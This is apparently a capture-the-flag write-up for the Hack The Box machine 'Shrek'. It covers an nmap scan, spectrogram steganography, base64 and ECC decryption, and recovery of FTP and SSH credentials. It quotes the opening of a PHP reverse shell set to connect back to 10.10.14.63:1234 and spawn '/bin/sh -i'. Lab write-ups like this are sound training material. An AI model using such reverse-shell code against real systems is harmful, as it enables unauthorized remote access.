# Shrek
#### 10.10.10.47

```{r, engine='bash', count_lines}
nmap -A -v 10.10.10.47

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:a7:95:95:5d:dd:75:ca:bc:de:36:2c:33:f6:47:ef (RSA)
|   256 b5:1f:0b:9f:83:b3:6c:3b:6b:8b:71:f4:ee:56:a8:83 (ECDSA)
|_  256 1f:13:b7:36:8d:cd:46:6c:29:6d:be:e4:ab:9c:24:5b (EdDSA)
80/tcp open  http    Apache httpd 2.4.27 ((Unix))
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Unix)
|_http-title: Home
Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Linux 3.2 (98%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Linux 4.4 (96%), Microsoft Windows XP SP3 (95%), BlueArc Titan 2100 NAS device (91%)
No exact OS matches for host (test conditions non-ideal).

```
Yey we got port 80 so let's have a look at the webpage. Alright we can upload something to the site.. can we read the /uploads/ directory?
Yes we can, secret_ultimate.php sounds interesting, let's have a look at it.

```
<?php

set_time_limit (0);
$VERSION = "1.0";
$end_path = site/secret_area_51 // friggin' finally found the secret dir!!
$ip = '10.10.14.63';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

...

```
okay so apparently there should be a /secret_area_51 directory. And indeed there is.
The only file there is the **Smash Mouth - All Star.mp3**.. I smell steganography.
One of the easiest steganography methods on sound files is hiding someting in the spectogramm so let's check for that.

![spectogramm](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Shrek/images/spectogramm.png "spectogramm")

Alright that was easy, we got the FTP creds: **donkey:d0nk3y1337!**

Oh I love it when they flood you with files.. So scrolling through those text files on the FTP server, you'll find something quite obvious, there are two base64 encrypted strings:

```
UHJpbmNlQ2hhcm1pbmc=
```
which translates to:
```
PrinceCharming
```
and
```
J1x4MDFceGQzXHhlMVx4ZjJceDE3VCBceGQwXHg4YVx4ZDZceGUyXHhiZFx4OWVceDllflAoXHhmN1x4ZTlceGE1XHhjMUtUXHg5YUlceGRkXFwhXHg5NXRceGUxXHhkNnBceGFhInUyXHhjMlx4ODVGXHgxZVx4YmNceDAwXHhiOVx4MTdceDk3XHhiOFx4MGJceGM1eVx4ZWM8Sy1ncDlceGEwXHhjYlx4YWNceDlldFx4ODl6XHgxM1x4MTVceDk0RG5ceGViXHg5NVx4MTlbXHg4MFx4ZjFceGE4LFx4ODJHYFx4ZWVceGU4Q1x4YzFceDE1XHhhMX5UXHgwN1x4Y2N7XHhiZFx4ZGFceGYwXHg5ZVx4MWJoXCdRVVx4ZTdceDE2M1x4ZDRGXHhjY1x4YzVceDk5dyc=
```
which translates to:
```
'\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'
```

okay this looks like some ECC encryption. Let's load up our python module **seccure**, you can read about it here: https://pypi.python.org/pypi/seccure

```
>>> import seccure
>>> seccure.decrypt('\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w',b'PrinceCharming')
'The password for the ssh file is: shr3k1sb3st! and you have to ssh in as: sec\n'
```